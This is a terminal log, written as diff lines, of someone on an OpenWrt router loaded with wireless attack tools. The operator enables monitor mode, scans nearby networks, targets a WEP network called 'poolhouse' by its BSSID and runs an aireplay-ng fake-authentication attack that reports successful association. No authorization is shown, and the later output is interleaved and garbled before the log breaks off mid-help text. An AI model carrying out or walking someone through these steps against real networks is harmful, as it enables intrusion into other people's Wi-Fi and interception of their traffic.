+./modules/3.3.8/xt_mac.ko
+./modules/3.3.8/xt_multiport.ko
+./modules/3.3.8/xt_state.ko
+./modules/3.3.8/xt_tcpudp.ko
+./modules/3.3.8/ext4.ko
+./modules/3.3.8/crc16.ko
+./modules/3.3.8/jbd2.ko
+./modules/3.3.8/mbcache.ko
+./modules/3.3.8/usb-storage.ko
+./modules/3.3.8/scsi_mod.ko
+./modules/3.3.8/sd_mod.ko
+./netifd
+./netifd/dhcp.script
+./netifd/netifd-proto.sh
+./netifd/ppp-down
+./netifd/ppp-up
+./netifd/proto
+./netifd/proto/dhcp.sh
+./netifd/proto/ppp.sh
+./network
+./network/config.sh
+./network/switch.sh
+./preinit
+./preinit/02_default_set_state
+./preinit/03_preinit_do_ar71xx.sh
+./preinit/05_enable_reset_button_ar71xx
+./preinit/05_mount_skip
+./preinit/05_set_iface_mac_ar71xx
+./preinit/05_set_preinit_iface_ar71xx
+./preinit/10_check_for_mtd
+./preinit/10_essential_fs
+./preinit/10_indicate_failsafe
+./preinit/10_indicate_preinit
+./preinit/20_check_jffs2_ready
+./preinit/20_device_fs_mount
+./preinit/30_device_fs_daemons
+./preinit/30_failsafe_wait
+./preinit/40_init_shm
+./preinit/40_mount_devpts
+./preinit/40_mount_jffs2
+./preinit/40_run_failsafe_hook
+./preinit/41_merge_overlay_hooks
+./preinit/50_choose_console
+./preinit/50_indicate_regular_preinit
+./preinit/60_init_hotplug
+./preinit/70_initramfs_test
+./preinit/70_pivot_jffs2_root
+./preinit/80_mount_root
+./preinit/90_init_console
+./preinit/90_mount_no_jffs2
+./preinit/90_restore_config
+./preinit/99_10_failsafe_login
+./preinit/99_10_mount_no_mtd
+./preinit/99_10_run_init
+./preinit/60_pivot_usb_root
+./preinit/00_extroot.conf
+./preinit/55_determine_extroot_sysupgrade
+./preinit/50_determine_usb_root
+./uboot-envtools.sh
+./uci
+./uci/upload
+./upgrade
+./upgrade/allnet.sh
+./upgrade/common.sh
+./upgrade/dir825.sh
+./upgrade/keep.d
+./upgrade/keep.d/base-files
+./upgrade/keep.d/base-files-essential
+./upgrade/keep.d/firewall
+./upgrade/keep.d/ppp
+./upgrade/keep.d/uboot-envtools
+./upgrade/keep.d/uhttpd
+./upgrade/luci-add-conffiles.sh
+./upgrade/openmesh.sh
+./upgrade/platform.sh
+./wifi
+./wifi/hostapd.sh
+./wifi/mac80211.sh
+./wifi/wpa_supplicant.sh
+root@OpenWrt:/lib# cd /
+root@OpenWrt:/# find | grep pthread
+./mnt/usb/lib/libpthread-0.9.33.2.so
+./mnt/usb/lib/libpthread.so.0
+./mnt/usb/usr/lib/opkg/info/libpthread.control
+./mnt/usb/usr/lib/opkg/info/libpthread.list
+root@OpenWrt:/# export LD_LIBRARY_PATH=/mnt/usb/lib
+root@OpenWrt:/# cd /mnt/usb/
+root@OpenWrt:/mnt/usb# ls
+etc         lib         lost+found  sbin        usr
+root@OpenWrt:/mnt/usb# cd usr
+root@OpenWrt:/mnt/usb/usr# ls
+bin      include  lib      sbin     share
+root@OpenWrt:/mnt/usb/usr# cd bin
+root@OpenWrt:/mnt/usb/usr/bin# ls
+aircrack-ng         daq-modules-config  kismet_server       perl                sftp                twistd
+airdecap-ng         elinks              kstats              perl5.10.0          snort               u2boat
+airdecloak-ng       ettercap            makeivs-ng          python              snort.bin           u2spewfoo
+airpwn              etterfilter         mktap               python2.7           ssh                 vim
+buddy-ng            etterlog            nmap                reaver              sshtunnel.sh        wash
+bzip2               ivstools            openssl             scp                 sslstrip
+curl                kismet_client       packetforge-ng      sed                 tar
+root@OpenWrt:/mnt/usb/usr/bin# ./airpwn
+./airpwn: can't load library 'libcrypto.so.1.0.0'
+root@OpenWrt:/mnt/usb/usr/bin# ./aircrack-ng
+./aircrack-ng: can't load library 'libssl.so.1.0.0'
+root@OpenWrt:/mnt/usb/usr/bin# reboot
+root@OpenWrt:/mnt/usb/usr/bin# reConnection to 192.168.1.108 closed by remote host.
+Connection to 192.168.1.108 closed.
+agent@kali:~$ ssh root@192.168.1.108
+root@192.168.1.108's password: 
+
+
+BusyBox v1.19.4 (2013-03-14 11:28:31 UTC) built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+
+  _______                     ________        __
+ |       |.-----.-----.-----.|  |  |  |.----.|  |_
+ |   -   ||  _  |  -__|     ||  |  |  ||   _||   _|
+ |_______||   __|_____|__|__||________||__|  |____|
+          |__| W I R E L E S S   F R E E D O M
+ -----------------------------------------------------
+ ATTITUDE ADJUSTMENT (12.09, r36088)
+ -----------------------------------------------------
+  * 1/4 oz Vodka      Pour all ingredients into mixing
+  * 1/4 oz Gin        tin with ice, strain into glass.
+  * 1/4 oz Amaretto
+  * 1/4 oz Triple sec
+  * 1/4 oz Peach schnapps
+  * 1/4 oz Sour mix
+  * 1 splash Cranberry juice
+ -----------------------------------------------------
+root@OpenWrt:~# Write failed: Broken pipe
+agent@kali:~$ ssh root@192.168.1.108
+root@192.168.1.108's password: 
+
+
+BusyBox v1.19.4 (2013-03-14 11:28:31 UTC) built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+
+  _______                     ________        __
+ |       |.-----.-----.-----.|  |  |  |.----.|  |_
+ |   -   ||  _  |  -__|     ||  |  |  ||   _||   _|
+ |_______||   __|_____|__|__||________||__|  |____|
+          |__| W I R E L E S S   F R E E D O M
+ -----------------------------------------------------
+ ATTITUDE ADJUSTMENT (12.09, r36088)
+ -----------------------------------------------------
+  * 1/4 oz Vodka      Pour all ingredients into mixing
+  * 1/4 oz Gin        tin with ice, strain into glass.
+  * 1/4 oz Amaretto
+  * 1/4 oz Triple sec
+  * 1/4 oz Peach schnapps
+  * 1/4 oz Sour mix
+  * 1 splash Cranberry juice
+ -----------------------------------------------------
+root@OpenWrt:~# cd /mnt
+root@OpenWrt:/mnt# ls
+usb
+root@OpenWrt:/mnt# cd us
+-ash: cd: can't cd to us
+root@OpenWrt:/mnt# cd usb/
+root@OpenWrt:/mnt/usb# ls
+etc         lib         lost+found  sbin        usr
+root@OpenWrt:/mnt/usb# cd usr/
+root@OpenWrt:/mnt/usb/usr# ls
+bin      include  lib      sbin     share
+root@OpenWrt:/mnt/usb/usr# cd bin/
+root@OpenWrt:/mnt/usb/usr/bin# ls
+aircrack-ng         daq-modules-config  kismet_server       perl                sftp                twistd
+airdecap-ng         elinks              kstats              perl5.10.0          snort               u2boat
+airdecloak-ng       ettercap            makeivs-ng          python              snort.bin           u2spewfoo
+airpwn              etterfilter         mktap               python2.7           ssh                 vim
+buddy-ng            etterlog            nmap                reaver              sshtunnel.sh        wash
+bzip2               ivstools            openssl             scp                 sslstrip
+curl                kismet_client       packetforge-ng      sed                 tar
+root@OpenWrt:/mnt/usb/usr/bin# ./airpwn 
+usage: airpwn -c <conf file> -d <driver name> [interface options] [options]
+	<conf file> : configuration file
+	<driver name> : supported wireless driver name
+
+Interface options:
+	You can use -i to set all 3 interfaces at once, or use the
+	other options to set each interface individually.
+	-i <iface> : sets the listen/control/inject interface
+	-M <iface> : sets the listen (monitor) interface
+	-C <iface> : sets the control interface
+	-I <iface> : sets the injection interface
+
+Optional arguments:
+	-l <logfile> : log verbose data to a file
+	-f <filter> : bpf filter for libpcap
+	-F : assume no FCS values from the monitored interface
+	-m <max> : Specify the maximum data chunk size (MTU - headers)
+	-k <WEP key>: key to use to de/encrypt WEP packets.  You can
+		use this option multiple times to specify multiple WEP keys.
+	-v : increase verbosity (can be used multiple times)
+	-h : get help (this stuff)
+
+Supported drivers are: wlan-ng hostap airjack prism54 madwifi rtl8180 rt2500 
+root@OpenWrt:/mnt/usb/usr/bin# ./aircrack-ng 
+
+  Aircrack-ng 1.1 - (C) 2006, 2007, 2008, 2009 Thomas d'Otreppe
+  Original work: Christophe Devine
+  http://www.aircrack-ng.org
+
+  usage: aircrack-ng [options] <.cap / .ivs file(s)>
+
+  Common options:
+
+      -a <amode> : force attack mode (1/WEP, 2/WPA-PSK)
+      -e <essid> : target selection: network identifier
+      -b <bssid> : target selection: access point's MAC
+      -p <nbcpu> : # of CPU to use  (default: all CPUs)
+      -q         : enable quiet mode (no status output)
+      -C <macs>  : merge the given APs to a virtual one
+      -l <file>  : write key to file
+
+  Static WEP cracking options:
+
+      -c         : search alpha-numeric characters only
+      -t         : search binary coded decimal chr only
+      -h         : search the numeric key for Fritz!BOX
+      -d <mask>  : use masking of the key (A1:XX:CF:YY)
+      -m <maddr> : MAC address to filter usable packets
+      -n <nbits> : WEP key length :  64/128/152/256/512
+      -i <index> : WEP key index (1 to 4), default: any
+      -f <fudge> : bruteforce fudge factor,  default: 2
+      -k <korek> : disable one attack method  (1 to 17)
+      -x or -x0  : disable bruteforce for last keybytes
+      -x1        : last keybyte bruteforcing  (default)
+      -x2        : enable last  2 keybytes bruteforcing
+      -y         : experimental  single bruteforce mode
+      -K         : use only old KoreK attacks (pre-PTW)
+      -s         : show the key in ASCII while cracking
+      -M <num>   : specify maximum number of IVs to use
+      -D         : WEP decloak, skips broken keystreams
+      -P <num>   : PTW debug:  1: disable Klein, 2: PTW
+      -1         : run only 1 try to crack key with PTW
+
+  WEP and WPA-PSK cracking options:
+
+      -w <words> : path to wordlist(s) filename(s)
+
+      --help     : Displays this usage screen
+
+No file to crack specified.
+root@OpenWrt:/mnt/usb/usr/bin# ifconif
+-ash: ifconif: not found
+root@OpenWrt:/mnt/usb/usr/bin# ifconfig
+br-lan    Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          inet addr:192.168.1.108  Bcast:192.168.1.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:617 errors:0 dropped:245 overruns:0 frame:0
+          TX packets:222 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:76258 (74.4 KiB)  TX bytes:29374 (28.6 KiB)
+
+eth0      Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:671 errors:0 dropped:15 overruns:0 frame:0
+          TX packets:225 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:100608 (98.2 KiB)  TX bytes:29512 (28.8 KiB)
+          Interrupt:4 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:16 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:16 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:1648 (1.6 KiB)  TX bytes:1648 (1.6 KiB)
+
+wlan0     Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:306 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:32 
+          RX bytes:0 (0.0 B)  TX bytes:59953 (58.5 KiB)
+
+root@OpenWrt:/mnt/usb/usr/bin# ./airmon-ng
+-ash: ./airmon-ng: not found
+root@OpenWrt:/mnt/usb/usr/bin# ls.
+-ash: ls.: not found
+root@OpenWrt:/mnt/usb/usr/bin# ls
+aircrack-ng         daq-modules-config  kismet_server       perl                sftp                twistd
+airdecap-ng         elinks              kstats              perl5.10.0          snort               u2boat
+airdecloak-ng       ettercap            makeivs-ng          python              snort.bin           u2spewfoo
+airpwn              etterfilter         mktap               python2.7           ssh                 vim
+buddy-ng            etterlog            nmap                reaver              sshtunnel.sh        wash
+bzip2               ivstools            openssl             scp                 sslstrip
+curl                kismet_client       packetforge-ng      sed                 tar
+root@OpenWrt:/mnt/usb/usr/bin# ls -l
+-rwxr-xr-x    1 root     root         55448 May  9 00:52 aircrack-ng
+-rwxr-xr-x    1 root     root         20440 May  9 00:52 airdecap-ng
+-rwxr-xr-x    1 root     root         16872 May  9 00:52 airdecloak-ng
+-rwxr-xr-x    1 root     root         15016 May  9 00:53 airpwn
+-rwxr-xr-x    1 root     root          8456 May  9 00:52 buddy-ng
+-rwxr-xr-x    1 root     root         25056 May  8 23:42 bzip2
+-rwxr-xr-x    1 root     root         69312 May  8 23:50 curl
+-rwxr-xr-x    1 root     root           589 May  9 05:16 daq-modules-config
+-rwxr-xr-x    1 root     root        541576 May  9 03:16 elinks
+-rwxr-xr-x    1 root     root        217308 May  9 03:24 ettercap
+-rwxr-xr-x    1 root     root         33912 May  9 03:24 etterfilter
+-rwxr-xr-x    1 root     root         37980 May  9 03:24 etterlog
+-rwxr-xr-x    1 root     root         20744 May  9 00:52 ivstools
+-rwxr-xr-x    1 root     root        556120 May  9 05:00 kismet_client
+-rwxr-xr-x    1 root     root        671847 May  9 05:00 kismet_server
+-rwxr-xr-x    1 root     root          5544 May  9 00:52 kstats
+-rwxr-xr-x    1 root     root         13464 May  9 00:52 makeivs-ng
+-rwxr-xr-x    1 root     root           644 May  9 08:12 mktap
+-rwxr-xr-x    1 root     root       1969712 May  9 06:19 nmap
+-rwxr-xr-x    1 root     root        474752 May  8 23:33 openssl
+-rwxr-xr-x    1 root     root         24776 May  9 00:52 packetforge-ng
+lrwxrwxrwx    1 root     root            10 May 10 01:22 perl -> perl5.10.0
+-rwxr-xr-x    1 root     root        816440 May  9 02:11 perl5.10.0
+lrwxrwxrwx    1 root     root             9 May 10 01:27 python -> python2.7
+-rwxr-xr-x    1 root     root        915352 May  9 01:23 python2.7
+-rwxr-xr-x    1 root     root        363640 May  9 07:40 reaver
+-rwxr-xr-x    1 root     root         50236 May  9 06:58 scp
+-rwxr-xr-x    1 root     root         65016 May  9 07:52 sed
+-rwxr-xr-x    1 root     root         87428 May  9 06:58 sftp
+-rwxr-xr-x    1 root     root            53 May  9 08:01 snort
+-rwxr-xr-x    1 root     root        775432 May  9 08:01 snort.bin
+-rwxr-xr-x    1 root     root        565507 May  9 06:58 ssh
+-rwxr-xr-x    1 root     root           530 May  9 08:11 sshtunnel.sh
+-rwxr-xr-x    1 root     root          4066 May  9 08:12 sslstrip
+-rwxr-xr-x    1 root     root        206360 May  9 08:23 tar
+-rwxr-xr-x    1 root     root           660 May  9 08:12 twistd
+-rwxr-xr-x    1 root     root          5192 May  9 08:01 u2boat
+-rwxr-xr-x    1 root     root          8856 May  9 08:01 u2spewfoo
+-rwxr-xr-x    1 root     root        319304 May  9 08:40 vim
+-rwxr-xr-x    1 root     root        185468 May  9 07:40 wash
+root@OpenWrt:/mnt/usb/usr/bin# airmon-ng
+Wireless tools not found
+root@OpenWrt:/mnt/usb/usr/bin# opkg -dest usb install wireless-tools
+Unknown package 'wireless-tools'.
+Collected errors:
+ * opkg_install_cmd: Cannot install package wireless-tools.
+root@OpenWrt:/mnt/usb/usr/bin# opkg -dest usb install wireless-tools
+Unknown package 'wireless-tools'.
+Collected errors:
+ * opkg_install_cmd: Cannot install package wireless-tools.
+root@OpenWrt:/mnt/usb/usr/bin# opkg -dest usb install wireless
+Unknown package 'wireless'.
+Collected errors:
+ * opkg_install_cmd: Cannot install package wireless.
+root@OpenWrt:/mnt/usb/usr/bin# ping google.com
+PING google.com (173.194.46.2): 56 data bytes
+64 bytes from 173.194.46.2: seq=0 ttl=52 time=14.066 ms
+^C
+--- google.com ping statistics ---
+1 packets transmitted, 1 packets received, 0% packet loss
+round-trip min/avg/max = 14.066/14.066/14.066 ms
+root@OpenWrt:/mnt/usb/usr/bin# opkg
+opkg must have one sub-command argument
+usage: opkg [options...] sub-command [arguments...]
+where sub-command is one of:
+
+Package Manipulation:
+	update			Update list of available packages
+	upgrade <pkgs>		Upgrade packages
+	install <pkgs>		Install package(s)
+	configure <pkgs>	Configure unpacked package(s)
+	remove <pkgs|regexp>	Remove package(s)
+	flag <flag> <pkgs>	Flag package(s)
+	 <flag>=hold|noprune|user|ok|installed|unpacked (one per invocation)
+
+Informational Commands:
+	list			List available packages
+	list-installed		List installed packages
+	list-upgradable		List installed and upgradable packages
+	list-changed-conffiles	List user modified configuration files
+	files <pkg>		List files belonging to <pkg>
+	search <file|regexp>	List package providing <file>
+	find <regexp>		List packages whose name or description matches <regexp>
+	info [pkg|regexp]	Display all info for <pkg>
+	status [pkg|regexp]	Display all status for <pkg>
+	download <pkg>		Download <pkg> to current directory
+	compare-versions <v1> <op> <v2>
+	                    compare versions using <= < > >= = << >>
+	print-architecture	List installable package architectures
+	depends [-A] [pkgname|pat]+
+	whatdepends [-A] [pkgname|pat]+
+	whatdependsrec [-A] [pkgname|pat]+
+	whatrecommends[-A] [pkgname|pat]+
+	whatsuggests[-A] [pkgname|pat]+
+	whatprovides [-A] [pkgname|pat]+
+	whatconflicts [-A] [pkgname|pat]+
+	whatreplaces [-A] [pkgname|pat]+
+
+Options:
+	-A			Query all packages not just those installed
+	-V[<level>]		Set verbosity level to <level>.
+	--verbosity[=<level>]	Verbosity levels:
+					0 errors only
+					1 normal messages (default)
+					2 informative messages
+					3 debug
+					4 debug level 2
+	-f <conf_file>		Use <conf_file> as the opkg configuration file
+	--conf <conf_file>
+	--cache <directory>	Use a package cache
+	-d <dest_name>		Use <dest_name> as the the root directory for
+	--dest <dest_name>	package installation, removal, upgrading.
+				<dest_name> should be a defined dest name from
+				the configuration file, (but can also be a
+				directory name in a pinch).
+	-o <dir>		Use <dir> as the root directory for
+	--offline-root <dir>	offline installation of packages.
+	--add-arch <arch>:<prio>	Register architecture with given priority
+	--add-dest <name>:<path>	Register destination with given path
+
+Force Options:
+	--force-depends		Install/remove despite failed dependencies
+	--force-maintainer	Overwrite preexisting config files
+	--force-reinstall	Reinstall package(s)
+	--force-overwrite	Overwrite files from other package(s)
+	--force-downgrade	Allow opkg to downgrade packages
+	--force-space		Disable free space checks
+	--force-postinstall	Run postinstall scripts even in offline mode
+	--force-remove	Remove package even if prerm script fails
+	--noaction		No action -- test only
+	--download-only	No action -- download only
+	--nodeps		Do not follow dependencies
+	--nocase		Perform case insensitive pattern matching
+	--force-removal-of-dependent-packages
+				Remove package and all dependencies
+	--autoremove		Remove packages that were installed
+				automatically to satisfy dependencies
+	-t			Specify tmp-dir.
+	--tmp-dir		Specify tmp-dir.
+
+ regexp could be something like 'pkgname*' '*file*' or similar
+ e.g. opkg info 'libstd*' or opkg search '*libop*' or opkg remove 'libncur*'
+root@OpenWrt:/mnt/usb/usr/bin# opkg update
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/Packages.gz.
+Updated list of available packages in /var/opkg-lists/snapshots.
+root@OpenWrt:/mnt/usb/usr/bin# opkg upgrade
+opkg: the ``upgrade'' command requires at least one argument
+usage: opkg [options...] sub-command [arguments...]
+where sub-command is one of:
+
+Package Manipulation:
+	update			Update list of available packages
+	upgrade <pkgs>		Upgrade packages
+	install <pkgs>		Install package(s)
+	configure <pkgs>	Configure unpacked package(s)
+	remove <pkgs|regexp>	Remove package(s)
+	flag <flag> <pkgs>	Flag package(s)
+	 <flag>=hold|noprune|user|ok|installed|unpacked (one per invocation)
+
+Informational Commands:
+	list			List available packages
+	list-installed		List installed packages
+	list-upgradable		List installed and upgradable packages
+	list-changed-conffiles	List user modified configuration files
+	files <pkg>		List files belonging to <pkg>
+	search <file|regexp>	List package providing <file>
+	find <regexp>		List packages whose name or description matches <regexp>
+	info [pkg|regexp]	Display all info for <pkg>
+	status [pkg|regexp]	Display all status for <pkg>
+	download <pkg>		Download <pkg> to current directory
+	compare-versions <v1> <op> <v2>
+	                    compare versions using <= < > >= = << >>
+	print-architecture	List installable package architectures
+	depends [-A] [pkgname|pat]+
+	whatdepends [-A] [pkgname|pat]+
+	whatdependsrec [-A] [pkgname|pat]+
+	whatrecommends[-A] [pkgname|pat]+
+	whatsuggests[-A] [pkgname|pat]+
+	whatprovides [-A] [pkgname|pat]+
+	whatconflicts [-A] [pkgname|pat]+
+	whatreplaces [-A] [pkgname|pat]+
+
+Options:
+	-A			Query all packages not just those installed
+	-V[<level>]		Set verbosity level to <level>.
+	--verbosity[=<level>]	Verbosity levels:
+					0 errors only
+					1 normal messages (default)
+					2 informative messages
+					3 debug
+					4 debug level 2
+	-f <conf_file>		Use <conf_file> as the opkg configuration file
+	--conf <conf_file>
+	--cache <directory>	Use a package cache
+	-d <dest_name>		Use <dest_name> as the the root directory for
+	--dest <dest_name>	package installation, removal, upgrading.
+				<dest_name> should be a defined dest name from
+				the configuration file, (but can also be a
+				directory name in a pinch).
+	-o <dir>		Use <dir> as the root directory for
+	--offline-root <dir>	offline installation of packages.
+	--add-arch <arch>:<prio>	Register architecture with given priority
+	--add-dest <name>:<path>	Register destination with given path
+
+Force Options:
+	--force-depends		Install/remove despite failed dependencies
+	--force-maintainer	Overwrite preexisting config files
+	--force-reinstall	Reinstall package(s)
+	--force-overwrite	Overwrite files from other package(s)
+	--force-downgrade	Allow opkg to downgrade packages
+	--force-space		Disable free space checks
+	--force-postinstall	Run postinstall scripts even in offline mode
+	--force-remove	Remove package even if prerm script fails
+	--noaction		No action -- test only
+	--download-only	No action -- download only
+	--nodeps		Do not follow dependencies
+	--nocase		Perform case insensitive pattern matching
+	--force-removal-of-dependent-packages
+				Remove package and all dependencies
+	--autoremove		Remove packages that were installed
+				automatically to satisfy dependencies
+	-t			Specify tmp-dir.
+	--tmp-dir		Specify tmp-dir.
+
+ regexp could be something like 'pkgname*' '*file*' or similar
+ e.g. opkg info 'libstd*' or opkg search '*libop*' or opkg remove 'libncur*'
+root@OpenWrt:/mnt/usb/usr/bin# opkg upgrade wireless-tools
+Installing wireless-tools (29-5) to root...
+Downloading http://downloads.openwrt.org/snapshots/trunk/ar71xx/packages/wireless-tools_29-5_ar71xx.ipk.
+Configuring wireless-tools.
+root@OpenWrt:/mnt/usb/usr/bin# airmon-ng
+
+
+Interface	Chipset		Driver
+
+wlan0		Atheros 	ath9k - [phy0]
+
+root@OpenWrt:/mnt/usb/usr/bin# airodump-ng mon0
+Interface mon0: 
+ioctl(SIOCGIFINDEX) failed: No such device
+root@OpenWrt:/mnt/usb/usr/bin# airmon-ng start wlan0
+ps: invalid option -- A
+BusyBox v1.19.4 (2013-03-14 11:28:31 UTC) multi-call binary.
+
+Usage: ps 
+
+Show list of processes
+
+	w	Wide output
+
+
+
+Interface	Chipset		Driver
+
+wlan0		Atheros 	ath9k - [phy0]
+				(monitor mode enabled on mon0)
+
+root@OpenWrt:/mnt/usb/usr/bin# airodump-ng mon0
+
+
+
+
+ CH 11 ][ Elapsed: 4 mins ][ 2014-05-10 14:23                                         
+                                                                                                                                    
+ BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID                                                     
+                                                                                                                                    
+ 88:51:FB:24:D3:5F  -80     2214        0    0  11  54e. WPA2 CCMP   PSK  HP-Print-5F-Officejet Pro 8600                            
+ 28:C6:8E:CF:ED:A9  -82     1723        0    0  11  54e  WPA2 CCMP   PSK  ngHub_319437NA002EE                                       
+ E0:91:F5:FD:D7:E2  -83       93       67    0  11  54e  WEP  WEP         poolhouse                                                 
+ E0:91:F5:85:4D:06  -40        4        2    0   8  54e  WPA2 CCMP   PSK  MatchBox                                                  
+                                                                                                                                    
+ BSSID              STATION            PWR   Rate    Lost  Packets  Probes                                                          
+                                                                                                                                     
+ (not associated)   68:5D:43:65:CB:79  -28    0 - 1      0       36  MatchBox                                                        
+ (not associated)   30:19:66:CD:96:8F  -53    0 - 1      0        5                                                                  
+ (not associated)   00:25:AE:E6:09:EB  -64    0 - 1     36      368  INFINITUMsf3s                                                   
+ (not associated)   00:6B:9E:3B:F7:BD  -84    0 - 1     84       47  Carson1                                                         
+ (not associated)   A0:0B:BA:FD:98:3E  -77    0 - 1      0        2                                                                  
+ E0:91:F5:FD:D7:E2  90:A4:DE:9B:2C:63  -77    1e- 2e     0       48                                                                  
+ E0:91:F5:85:4D:06  00:23:4E:31:23:D2  -51    0 - 1e     0       34  MatchBox                                                        
+
+root@OpenWrt:/mnt/usb/usr/bin# airodump-ng -c 11 --bssid E0:91:F5:FD:D7:E2 -w output mon0
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Mem: 24136K used, 5076K free, 0K shrd, 2444K buff, 9200K cached
+CPU:   0% usr   0% sys   0% nic  99% idle   0% io   0% irq   0% sirq
+Load average: 0.19 0.17 0.11 1/46 1782
+  PID  PPID USER     STAT   VSZ %VSZ %CPU COMMAND
+ 1782  1608 root     R     1500   5%   1% top
+ 1261     1 root     S     1424   5%   0% hostapd -P /var/run/wifi-phy0.pid -B
+ 1773  1608 root     T     5040  17%   0% airodump-ng -c 11 --bssid E0:91:F5:FD
+  695     1 root     S     1524   5%   0% /sbin/netifd
+ 1608  1607 root     S     1508   5%   0% -ash
+  758   695 root     S     1508   5%   0% udhcpc -p /var/run/udhcpc-br-lan.pid
+  615     1 root     S     1508   5%   0% /sbin/syslogd -C16
+    1     0 root     S     1504   5%   0% init
+  500     1 root     S     1504   5%   0% init
+ 1604     1 root     S     1500   5%   0% /usr/sbin/ntpd -n -p 0.openwrt.pool.n
+ 1219     1 root     S     1500   5%   0% /sbin/watchdog -t 5 /dev/watchdog
+  617     1 root     S     1488   5%   0% /sbin/klogd
+ 1607  1548 root     S     1220   4%   0% /usr/sbin/dropbear -P /var/run/dropbe
+ 1548     1 root     S     1152   4%   0% /usr/sbin/dropbear -P /var/run/dropbe
+ 1566     1 root     S     1132   4%   0% /usr/sbin/uhttpd -f -h /www -r OpenWr
+ 1591     1 nobody   S      940   3%   0% /usr/sbin/dnsmasq -C /var/etc/dnsmasq
+  625     1 root     S      872   3%   0% /sbin/ubusd
+  619     1 root     S      860   3%   0% /sbin/hotplug2 --override --persisten
+  250     2 root     SW       0   0%   0% [kworker/0:1]
+    5     2 root     SW       0   0%   0% [kworker/u:0]
+@OpenWrt:/mnt/usb/usr/bin# @OpenWrt:/mnt/usb/usr/bin# -ash: 
+                                                            : not found
+@OpenWrt:/mnt/usb/usr/bin# @OpenWrt:/mnt/usb/usr/bin# @OpenWrt:/mnt/usb/usr/bin# @OpenWrt:/mnt/usb/usr/bin# @OpenWrt:/mnt/usb/usr/bin# @OpenWrt:/mnt/usb/usr/bin# @OpenWrt:/mnt/usb/usr/bin# -ash: johbs: not found
+@OpenWrt:/mnt/usb/usr/bin# -ash: johbs: not found
+@OpenWrt:/mnt/usb/usr/bin# @OpenWrt:/mnt/usb/usr/bin# @OpenWrt:/mnt/usb/usr/bin# @OpenWrt:/mnt/usb/usr/bin# @OpenWrt:/mnt/usb/usr/bin# @OpenWrt:/mnt/usb/usr/bin# No replay interface specified.
+"aireplay-ng --help" for help.   : not found
+@OpenWrt:/mnt/usb/usr/bin# @OpenWrt:/mnt/usb/usr/bin# @OpenWrt:/mnt/usb/usr/bin# @OpenWrt:/mnt/usb/usr/bin# No source MAC (-h) specified. Using the device MAC (0C:82:68:F9:20:7A)
+14:27:03  Waiting for beacon frame (BSSID: E0:91:F5:FD:D7:E2) on channel 11
+
+14:27:03  Sending Authentication Request (Open System)
+
+14:27:05  Sending Authentication Request (Open System)
+
+14:27:07  Sending Authentication Request (Open System)
+
+14:27:09  Sending Authentication Request (Open System)
+
+14:27:11  Sending Authentication Request (Open System)
+
+14:27:13  Sending Authentication Request (Open System) [ACK]
+
+14:27:15  Sending Authentication Request (Open System)
+
+14:27:17  Sending Authentication Request (Open System)
+
+14:27:19  Sending Authentication Request (Open System)
+14:27:19  Authentication successful
+14:27:19  Sending Association Request
+
+14:27:24  Sending Authentication Request (Open System)
+
+14:27:26  Sending Authentication Request (Open System)
+
+14:27:28  Sending Authentication Request (Open System)
+14:27:28  Authentication successful
+14:27:28  Sending Association Request
+
+14:27:33  Sending Authentication Request (Open System)
+14:27:33  Authentication successful
+14:27:33  Sending Association Request
+14:27:33  Association successful :-) (AID: 1)
+
+@OpenWrt:/mnt/usb/usr/bin# "aireplay-ng --help" for help.
+@OpenWrt:/mnt/usb/usr/bin# -ash: airpleay--: not found
+@OpenWrt:/mnt/usb/usr/bin# 
+  Aireplay-ng 1.1 - (C) 2006, 2007, 2008, 2009 Thomas d'Otreppe
+  Original work: Christophe Devine
+  http://www.aircrack-ng.org
+
+  usage: aireplay-ng <options> <replay interface>
+
+  Filter options:
+
+      -b bssid  : MAC address, Access Point
+      -d dmac   : MAC address, Destination
+      -s smac   : MAC address, Source
+      -m len    : minimum packet length
+      -n len    : maximum packet length
+      -u type   : frame control, type    field
+      -v subt   : frame control, subtype field
+      -t tods   : frame control, To      DS bit
+      -f fromds : frame control, From    DS bit
+      -w iswep  : frame control, WEP     bit
+      -D        : disable AP detection
+
+  Replay options:
+
+      -x nbpps  : number of packets per second
+      -p fctrl  : set frame control word (hex)
+      -a bssid  : set Access Point MAC address
+      -c dmac   : set Destination  MAC address
+      -h smac   : set Source       MAC address
+      -g value  : change ring buffer size (default: 8)
+      -F        : choose first matching packet
+
+      Fakeauth attack options:
+
+      -e essid  : set target AP SSID
+      -o npckts : number of packets per burst (0=auto, default: 1)
+      -q sec    : seconds between keep-alives
+      -y prga   : keystream for shared key auth
+      -T n      : exit after retry fake auth request n time
+
+      Arp Replay attack options:
+
+      -j        : inject FromDS packets
+
+      Fragmentation attack options:
+
+      -k IP     : set destination IP in fragments
+      -l IP     : set source IP in fragments
+
+      Test attack options:
+
+      -B        : activates the bitrate test
+
+  Source options:
+
+      -i iface  : capture packets from this interface
+      -r file   : extract packets from this pcap file
+
+  Miscellaneous options:
+
+      -R                    : disable /dev/rtc usage
+      --ignore-negative-one : if the interface's channel can't be determined,
